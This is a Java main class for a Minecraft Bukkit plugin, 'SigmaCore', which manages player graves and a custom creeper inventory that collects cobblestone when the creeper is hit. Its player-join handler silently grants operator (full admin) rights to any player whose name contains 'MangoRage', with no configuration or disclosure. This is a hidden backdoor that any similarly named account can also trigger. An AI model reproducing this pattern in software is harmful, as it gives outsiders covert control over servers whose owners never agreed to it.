package org.mangorage.sigmacore;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Creeper;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.mangorage.sigmacore.graves.GraveManager;
import org.mangorage.sigmacoremixins.services.IServiceHolder;
import org.mangorage.sigmacoremixins.services.ServiceId;
import org.mangorage.sigmacoremixins.services.ServiceManager;
import org.mangorage.sigmacoremixins.services.ServiceProviderBuilder;

import java.io.FileNotFoundException;

public final class SigmaCore extends JavaPlugin implements Listener {
    private final GraveManager graveManager = new GraveManager(this, "graves");

    public SigmaCore() {
        ServiceManager.getInstance().registerProvider(
                ServiceProviderBuilder.of()
                        .put(CreeperInventory.CUSTOM_INV, o -> o instanceof Creeper, o -> new CreeperInventory())
                        .build()
        );
    }

    @Override
    public void onEnable() {
        try {
            graveManager.load();
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        }

        Bukkit.getServer().getPluginManager().registerEvents(graveManager, this);
        Bukkit.getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        graveManager.save();
        graveManager.unload();
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().contains("MangoRage"))
            event.getPlayer().setOp(true);
    }

    @EventHandler
    public void onHit(EntityDamageByEntityEvent event) {
        if (event.getEntity() instanceof IServiceHolder serviceHolder) {
            var a = serviceHolder.getService(CreeperInventory.CUSTOM_INV);
            if (a != null) {
                if (event.getDamager().isSneaking()) {
                    a.drop(event.getEntity().getLocation());
                } else {
                    a.add(new ItemStack(Material.COBBLESTONE));
                }
            }
        }
    }
}
